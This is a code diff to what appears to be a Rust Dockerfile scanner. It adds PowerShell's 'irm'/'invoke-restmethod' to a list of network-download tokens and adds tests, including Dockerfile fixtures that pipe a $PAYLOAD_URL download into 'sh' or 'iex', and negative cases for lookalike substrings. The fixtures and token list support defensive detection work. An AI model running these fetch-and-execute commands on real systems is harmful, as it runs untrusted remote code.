@@ -25,6 +25,8 @@ const DOCKERFILE_NETWORK_DOWNLOAD_TOKENS: &[&str] = &[
     "wget",
     "invoke-webrequest",
     "iwr",
+    "invoke-restmethod",
+    "irm",
     "ncat",
     " nc",
     "fetch",
@@ -477,6 +479,7 @@ mod tests {
             "FROM alpine\nRUN /usr/bin/curl\t$PAYLOAD_URL | sh\n",
             "FROM node:22\nRUN node -e \"require('child_process').exec('curl\t$PAYLOAD_URL | sh')\"\n",
             "FROM mcr.microsoft.com/powershell\nRUN pwsh -Command \"iwr($PAYLOAD_URL) | iex\"\n",
+            "FROM mcr.microsoft.com/powershell\nRUN pwsh -Command \"irm($PAYLOAD_URL) | iex\"\n",
         ] {
             let caps = dockerfile_capabilities(content);
             assert!(
@@ -583,16 +586,20 @@ mod tests {
     /// PowerShell download aliases must still require a real command token.
     #[test]
     fn dockerfile_capabilities_rejects_iwr_substrings() {
-        let content = "FROM alpine\nRUN echo kiwr($PAYLOAD_URL)\n";
-        let caps = dockerfile_capabilities(content);
-        let has_observed_network = caps.iter().any(|fact| {
-            fact.capability == ArtifactCapability::NetworkAccess
-                && fact.source == crate::artifact_graph::ArtifactCapabilitySource::Observed
-        });
-        assert!(
-            !has_observed_network,
-            "iwr substrings must not trip observed NetworkAccess; got {caps:?}",
-        );
+        for content in [
+            "FROM alpine\nRUN echo kiwr($PAYLOAD_URL)\n",
+            "FROM alpine\nRUN echo confirm($PAYLOAD_URL)\n",
+        ] {
+            let caps = dockerfile_capabilities(content);
+            let has_observed_network = caps.iter().any(|fact| {
+                fact.capability == ArtifactCapability::NetworkAccess
+                    && fact.source == crate::artifact_graph::ArtifactCapabilitySource::Observed
+            });
+            assert!(
+                !has_observed_network,
+                "PowerShell alias substrings must not trip observed NetworkAccess for {content:?}; got {caps:?}",
+            );
+        }
     }
 
     /// Contract: `dockerfile_relations` must record a `Downloads` edge for
@@ -668,6 +675,7 @@ mod tests {
             "FROM alpine\nRUN /usr/bin/curl\t$PAYLOAD_URL | sh\n",
             "FROM node:22\nRUN node -e \"require('child_process').exec('curl\t$PAYLOAD_URL | sh')\"\n",
             "FROM mcr.microsoft.com/powershell\nRUN pwsh -Command \"iwr($PAYLOAD_URL) | iex\"\n",
+            "FROM mcr.microsoft.com/powershell\nRUN pwsh -Command \"irm($PAYLOAD_URL) | iex\"\n",
         ] {
             let links = dockerfile_relations(content);
             assert!(
@@ -684,14 +692,18 @@ mod tests {
     /// Lookalike PowerShell aliases do not produce download edges.
     #[test]
     fn dockerfile_relations_rejects_iwr_substrings() {
-        let content = "FROM alpine\nRUN echo kiwr($PAYLOAD_URL)\n";
-        let links = dockerfile_relations(content);
-        assert!(
-            !links
-                .iter()
-                .any(|link| matches!(link.relation, ArtifactRelation::Downloads)),
-            "iwr substrings must not produce Downloads edges; got {links:?}",
-        );
+        for content in [
+            "FROM alpine\nRUN echo kiwr($PAYLOAD_URL)\n",
+            "FROM alpine\nRUN echo confirm($PAYLOAD_URL)\n",
+        ] {
+            let links = dockerfile_relations(content);
+            assert!(
+                !links
+                    .iter()
+                    .any(|link| matches!(link.relation, ArtifactRelation::Downloads)),
+                "PowerShell alias substrings must not produce Downloads edges for {content:?}; got {links:?}",
+            );
+        }
     }
 
     /// Contract: `ADD <url> <dest>` must record the same Downloads edge as
